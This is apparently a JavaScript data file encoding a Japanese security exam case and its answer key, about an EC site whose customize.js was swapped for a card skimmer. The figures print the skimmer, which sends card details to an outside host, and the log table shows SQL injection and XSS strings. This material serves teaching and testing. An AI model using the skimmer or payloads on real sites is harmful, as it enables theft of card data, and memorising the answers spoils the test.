const P=(id,printedPage,text,underlines)=>({id,printedPage,text,...(underlines?{underlines}:{})});
const T=(id,printedPage,caption,headers,rows,tableNotes=[])=>({id,printedPage,caption,headers,rows,tableNotes,kind:'table',classification:'B',renderText:true,text:caption});
const C=(id,printedPage,caption,text)=>({id,printedPage,caption,text,kind:'code',classification:'C',renderText:true});
export const fallQ3={promptPages:[29],sections:[
{id:'sec-1',heading:'導入',paragraphs:[
P('p-1',22,'問3 クレジットカード情報の漏えいに関する次の記述を読んで，設問に答えよ。'),
P('p-2',22,'J社は，インテリアを扱うECサイト（以下，J社のECサイトをJ社ECサイトという）を運営する，従業員200名の会社である。'),
]},
{id:'sec-2',heading:'J社ECサイトの構成',paragraphs:[
P('p-3',22,'J社ECサイトは，Webアプリケーションプログラム（以下，J社ECサイトのWebアプリケーションプログラムをWebアプリPという），Webサーバ及びDBサーバで構成されている。J社はWebアプリPの開発及び保守，並びにWebサーバ及びDBサーバの構築，管理及び保守をV社に委託している。WebアプリPのアプリケーションログには，アクセス日時，画面名，アカウント名，アクセス元IPアドレスなどが記録される。'),
P('p-4',22,'J社ECサイトでの支払方法は，クレジットカード決済及び銀行振込に対応している。クレジットカード決済はD社の決済代行サービスを利用している。D社の提供する決済用ECMAScriptプログラムを使用したトークン型決済を用いて，クレジットカード情報の非保持化を実現している。商品購入に関する画面の概要を表1に，画面遷移を図1に示す。'),
]},
{id:'sec-3',heading:'利用者からの問合せ',paragraphs:[
P('p-5',23,'6月11日から12日にかけて，複数の利用者から，クレジットカード情報を入力する画面が2回表示されるという問合せ，及び支払方法が勝手にクレジットカード決済になってしまうという問合せがあった。J社ECサイト担当者のGさんは，偽のクレジットカード情報入力フォーム（以下，偽フォームという）が表示された可能性があると考え，上司のRさんに報告した上で，Webサーバの6月11日のアクセスログに不審な点がないかどうかを確認した。Webサーバの6月11日のアクセスログのうち，不審と思われるアクセスを抽出したものを表2に示す。'),
P('p-6',24,'次は，アクセスログに関するRさんとGさんの会話である。'),
P('p-7',24,'Rさん：偽フォームの表示が可能な攻撃の痕跡はあったのか。'),
P('p-8',24,'Gさん：表2の［a］行目が［b］脆弱性を狙った攻撃だと思いますが，そういった攻撃であれば偽フォームの表示が可能です。さらに［b］脆弱性が［c］型であれば，1回の攻撃で多数の利用者に対して偽フォームの表示が可能です。'),
P('p-9',24,'Rさん：それとは別に，表2の［d］行目は［e］脆弱性を狙った攻撃の痕跡だと思うが，仮にその脆弱性が存在した場合に，偽フォームの表示は可能なのか。'),
P('p-10',24,'Gさん：WebアプリPが，DBサーバに格納している情報を基にWebページを動的に生成していれば可能かもしれません。'),
P('p-11',25,'Rさん：承知した。その他，表2の10行目のPUTメソッドでファイルが更新されている点も気になる。以前，セキュリティベンダーに依頼して報告を受けているWebアプリPの脆弱性診断レポートに，［b］脆弱性及び［e］脆弱性の指摘があるかどうかと，PUTメソッドによる更新はV社によるものかどうか，V社に至急確認してほしい。'),
P('p-12',25,'Gさんは，6月13日にV社に問い合わせた。また，最新バージョンのWebアプリPに対する脆弱性診断レポートを確認したところ，脆弱性の指摘はなかった。'),
]},
{id:'sec-4',heading:'偽フォーム表示の原因の調査と対策',paragraphs:[
P('p-13',25,'6月14日にV社から連絡があり，PUTメソッドによるファイル更新はV社によるものではなかったことが判明した。Webサーバに設置していたECMAScriptファイルの一つcustomize.jsが攻撃者のファイル（以下，ファイルKという）に置き換えられていた。customize.jsは，通常時は空のファイルであり，Webサイトのデザインを一時的に変更する際に利用するものである。①配送先・支払方法選択画面でファイルKが読み込まれており，HTMLの一部が書き換えられていた。この書換えによって，②配送先・支払方法選択画面から支払手続画面への画面遷移の処理で利用しているパラメータの値が変更され，支払方法がクレジットカード決済に固定されていた。ファイルKを整形したものを図2に，配送先・支払方法選択画面のHTMLソースを図3に示す。',[{label:'①',text:'配送先・支払方法選択画面でファイルKが読み込まれており，HTMLの一部が書き換えられていた。'},{label:'②',text:'配送先・支払方法選択画面から支払手続画面への画面遷移の処理で利用しているパラメータの値が変更され，支払方法がクレジットカード決済に固定されていた。'}]),
P('p-14',27,'その後，6月16日にV社から，customize.jsの置換えについての調査結果及び対処の報告があった。その報告を図4に示す。'),
]},
{id:'sec-5',heading:'クレジットカード情報の漏えいの調査と対策',paragraphs:[
P('p-15',27,'本件に関する利用者からの問合せは，6月15日21時45分が最後であり，合計32件あった。次は，customize.jsの置換えによる影響の調査に関するRさんとGさんの会話である。'),
P('p-16',27,'Rさん：クレジットカード情報入力フォームが2回表示されたのは，customize.jsが置き換えられていた影響で偽フォームが表示されたからだったのか。'),
P('p-17',27,'Gさん：そのとおりです。2回目に表示されたクレジットカード情報入力フォームにクレジットカード情報を入力し，送信している場合だけ，当社で注文が完了していました。'),
P('p-18',27,'Rさん：ダミーのクレジットカード情報を設定して図2でGETリクエストが送られる先のURLにアクセスしたところ，404のステータスコードが返ってきた。もし，攻撃者のWebサーバが適切なステータスコードを返しているとしたら，この結果から，攻撃者のWebサーバにWebアプリケーションプログラムが用意されておらず，クレジットカード情報は盗まれていないと判断してよいか。'),
P('p-19',28,'Gさん：③利用者が改ざんされた画面に入力して，クレジットカード情報が送信されてしまったときに，攻撃者のWebサーバでWebアプリケーションプログラムを用意していなくても，攻撃者は利用者の入力したクレジットカード情報を取得する方法があります。クレジットカード情報は盗まれたと判断すべきです。',[{label:'③',text:'利用者が改ざんされた画面に入力して，クレジットカード情報が送信されてしまったときに，攻撃者のWebサーバでWebアプリケーションプログラムを用意していなくても，攻撃者は利用者の入力したクレジットカード情報を取得する方法があります。'}]),
P('p-20',28,'Rさん：クレジットカード情報の漏えいの可能性について利用者に案内を出したい。攻撃者のWebサーバにクレジットカード情報を送信した利用者を特定してほしい。攻撃者のWebサーバに情報を送信してしまった利用者は漏れなく特定したいが，送信していない利用者はできるだけ含めたくない。そのためには，どのようにすればよいのか。'),
P('p-21',28,'Gさん：V社の報告から，customize.jsの置換えの影響のあった期間は6月11日13時12分から6月16日9時00分と考えられます。攻撃者のWebサーバにクレジットカード情報を送信する直前までの操作をした利用者を被害者候補として特定するために，その期間のアプリケーションログから［f］を抽出したいと思います。'),
P('p-22',28,'Rさん：それで抽出してくれ。'),
P('p-23',28,'その後，Gさんは，プロキシサーバなどのキャッシュの影響も考慮した上で，被害者候補を特定し，その情報を基に案内を出した。また，J社は，関係当局に報告，届出を行うとともに，V社と協力して再発防止策を検討し，実施した。さらに，Webサーバのファイルの改ざん検知の検討を行うことにした。'),
]},
],materials:[
T('table-1',22,'表1 商品購入に関する画面の概要（抜粋）',['画面名','説明'],[
['ショッピングカート','購入対象としてショッピングカートに登録された商品を表示する。ショッピングカートに登録した商品を購入する場合は，“購入”ボタンを押す。配送先・支払方法選択画面に遷移する。'],
['配送先・支払方法選択','配送先住所¹と支払方法を選択する。配送先住所を選択し，クレジットカード決済と銀行振込のいずれかの支払方法を選択して，“次へ”ボタンを押す。支払手続画面に遷移する。'],
['支払手続','支払方法に応じて，表示される内容及び入力する内容が異なる。クレジットカード決済の場合は，クレジットカード情報の入力フォームが表示される。D社の提供する決済用ECMAScriptプログラムによって，決済が行われる。銀行振込の場合は，振込先の口座情報が表示される。'],
['注文完了','ショッピングカート→配送先・支払方法選択→支払手続が完了した場合に表示される。この後に注文確認の電子メール²が商品を購入した利用者に送信される。'],
],['注1）利用者情報としてあらかじめ配送先住所を登録しておく。配送先住所は複数登録できる。登録済みの配送先住所はプルダウンで選択できる。','注2）利用者情報としてあらかじめ電子メールアドレスを登録しておく。']),
{id:'figure-1',kind:'figure',classification:'D',printedPage:23,caption:'図1 商品購入に関する画面遷移',renderText:true,assetUrl:'/questions/sc/b/2024-fall/q3-figure-1.svg',text:'画面の全ラベル・数値・選択状態・入力欄と矢印を図に保持する。\n注記1 /cartなどはURLのパス名を示す。\n注記2 /cart以外へのアクセスはJ社ECサイトへのログインが必要である。\n注記3 /cart以外は直接アクセスするとトップページにリダイレクトされる。'},
T('table-2',24,'表2 Webサーバのアクセスログ',['行番号','メソッド','リクエストURI','ステータスコード'],[
['1','GET','/products/list?page=4&category_id=1','200'],
['2','GET',"/login?id=hoge&pw='UNION select 1 FROM…",'200'],
['3','POST','/mypage/userinfo','200'],['4','POST','/mypage/change','200'],
['5','GET','/cart?add="><script>document.getElementById(…','200'],
['6','GET',"/products/list?category=green’s sofa",'200'],
['7','PUT','/shopping','405'],['8','GET','/cart','200'],['9','POST','/payment','200'],['10','PUT','/ec-j/layout/js/customize.js','204'],
],['注記1 アクセス日時，User-Agent，リファラなどは省略している。','注記2 リクエストURI中の“…”は省略を表す。','注記3 リクエストURIは，URLデコード済みである。']),
],readingOrder:['sec-1','p-1','p-2','sec-2','p-3','p-4','table-1','figure-1','sec-3','p-5','table-2','p-6','p-7','p-8','p-9','p-10','p-11','p-12','sec-4','p-13','figure-2','figure-3','p-14','figure-4','sec-5','p-15','p-16','p-17','p-18','p-19','p-20','p-21','p-22','p-23'],units:[]};
fallQ3.materials.push(
C('figure-2',26,'図2 整形後のファイルK',`1:  if (location.pathname == '/shopping'){
2:    let elem = document.querySelector("#shopping-form > div > div > div.order_payment > div.radio");
3:    elem.innerHTML='<p>カード番号<input type="text" id="get_number" /></p><p>有効期限<input type="text" id="get_exp_month" />月/<input type="text" id="get_exp_year" />年</p><p>名義<input type="text" id="get_name" /></p><p>セキュリティコード<input type="text" id="get_code" /></p><input type="hidden" name="order[Payment]" value="1" />';
4:    let form = document.getElementById('shopping-form');
5:    form.addEventListener('submit', function() {
6:      const req = new XMLHttpRequest();
7:      let number = document.getElementById('get_number').value;
8:      let exp_month = document.getElementById('get_exp_month').value;
9:      let exp_year = document.getElementById('get_exp_year').value;
10:     let name = document.getElementById('get_name').value;
11:     let code = document.getElementById('get_code').value;
12:     let url = 'https://i-sha.com/?num=' + number + '&exp=' + exp_month + '%2F' + exp_year + '&name=' + name + '&code=' + code;
13:     req.open("GET", url);
14:     req.send();
15:   });
16: }`),
C('figure-3',26,'図3 配送先・支払方法選択画面のHTMLソース',`（省略）
<form id="shopping-form" method="post" action="/payment">
<div class="order">
<div class="order_detail">
（省略）
<div class="order_payment">
<div><h2>お支払方法</h2></div>
<div class="radio">
<input type="radio" id="Payment_1" name="order[Payment]" required data-trigger="change" value="1" checked />
<label for="Payment_1"><span>クレジットカード決済</span></label>
<input type="radio" id="Payment_2" name="order[Payment]" required data-trigger="change" value="2" />
<label for="Payment_2"><span>銀行振込</span></label>
</div>
（省略）
<button type="submit" class="blockBtn">次へ</button>
</form>
（省略）
    <script src="/ec-j/layout/js/customize.js"></script>
</body>
</html>
注記 CSRF対策のトークンの記述は省略している。`),
{id:'figure-4',kind:'text',classification:'A',printedPage:27,caption:'図4 V社からの調査結果及び対処の報告',renderText:true,text:'・V社でPUTメソッドに関する設定変更を6月8日18時12分に実施した。\n　Webサーバのファイル更新は，事前申請をした後にWebサーバにSSHで接続して行う運用であるが，V社の作業者がSSHで接続せずにファイルを更新できるように，/ec-j/layout/js/配下だけ，未認証でもPUTメソッドでファイルの更新を許可する設定にした。\n・V社で6月9日9時00分から10時42分の間にJ社ECサイトのメンテナンスを実施した。\n　メンテナンスではPUTメソッドを使用した。\n・customize.jsの置換えは6月11日13時12分に行われた。\n　PUTメソッドを使って，ファイルKに置き換えられた。\n　WebアプリPの仕様上，customize.jsの読み込みは無効にできない。\n　customize.js以外のファイルの置換えはなかった。\n・6月16日8時5分にPUTメソッドによるファイルの更新を禁止する設定にし，customize.jsを置換え前のファイルに戻した。\n・6月16日9時00分にCache Bustingを実施した。\n　ファイルKのキャッシュ破棄とcustomize.jsの再読み込みの二つを行わせるための変更をした。'}
);
fallQ3.units=[
{label:'設問1',promptText:'設問1 本文中の［a］～［e］に入れる適切な行番号又は字句を答えよ。',evidenceRefs:['table-2','p-8','p-9','p-10'],knowledge:'XSSの反射型・格納型・DOMベースの区別とSQLインジェクションの入力痕跡。',points:['aはscriptを含む5行目','bはクロスサイトスクリプティング','cは1回で多数に作用する格納型','dはUNIONを含む2行目','eはSQLインジェクション'],commonMistakes:'採点講評の観点に沿って，保存した攻撃が後の閲覧者にも作用する格納型と，1回の要求へ応答する反射型を区別する。検出された試行を，実際に悪用できた脆弱性があったと断定しない。'},
{label:'設問2(1)',promptText:'設問2 ［偽フォーム表示の原因の調査と対策］について答えよ。\n(1) 本文中の下線①について，書換え後の画面全体を図示せよ。',evidenceRefs:['figure-1','figure-2','figure-3','p-13'],knowledge:'querySelectorで選択したDOM要素のinnerHTMLを書き換える範囲。',points:['配送先プルダウンとお支払方法の見出しを残す','ラジオボタン2選択肢を除く','カード番号・有効期限の月/年・名義・セキュリティコードを追加する','戻る・次へを残す'],commonMistakes:'採点講評の過不足を防ぐ。div.radioだけが置き換わるので，支払方法の選択肢を残したり，配送先や戻るボタンまで消したりしない。type=hiddenは画面には表示しない。'},
{label:'設問2(2)',promptText:'設問2 ［偽フォーム表示の原因の調査と対策］について答えよ。\n(2) 本文中の下線②について，パラメータ名とその値を答えよ。',evidenceRefs:['figure-2','figure-3','p-13'],knowledge:'フォーム送信のname/valueと画面表示文字の区別。',points:['hiddenのnameはorder[Payment]','valueは1'],fieldPoints:{'パラメータ名':['大文字小文字と角括弧を含めorder[Payment]を答える'],'値':['クレジットカード決済を表す1を答える']}},
{label:'設問2(3)',promptText:'設問2 ［偽フォーム表示の原因の調査と対策］について答えよ。\n(3) 図2について，4～15行目の処理内容を具体的に答えよ。',evidenceRefs:['figure-2','figure-3'],knowledge:'submitイベントのリスナー登録とXMLHttpRequestによるGETの送信。',points:['addEventListenerで配送先・支払方法選択画面のformへ登録','submit時にカード情報をクエリパラメータとしてi-sha.comへ送信する']},
{label:'設問3(1)',promptText:'設問3 ［クレジットカード情報の漏えいの調査と対策］について答えよ。\n(1) 本文中の下線③について，攻撃者のWebサーバでクレジットカード情報を取得する方法を答えよ。',evidenceRefs:['figure-2','p-18','p-19'],knowledge:'GETのクエリを含むリクエストURIはWebサーバのアクセスログに記録される。',points:['WebサーバのアクセスログのリクエストURIから情報を取得する'],commonMistakes:'採点講評の盗聴やキーロガーという誤答を避ける。攻撃者が既に受信するGET要求のURLに情報がある。404でもリクエストは到達しログが残り得る。'},
{label:'設問3(2)',promptText:'設問3 ［クレジットカード情報の漏えいの調査と対策］について答えよ。\n(2) 本文中の［f］に入れる適切な字句を答えよ。',evidenceRefs:['p-3','figure-1','figure-2','figure-4','p-20','p-21'],knowledge:'被害が起こる画面と直前操作をアプリケーションログのアカウント名へ対応づける。',points:['影響期間の配送先・支払方法選択画面にアクセスしたアカウント名を抽出する'],commonMistakes:'注文完了だけでは偽フォームから送った後に注文を中断した利用者を漏らす。カート全員では広過ぎる。直前までという要求と，コードが動作する/shoppingを対応させ，キャッシュの影響も考慮する。'},
];

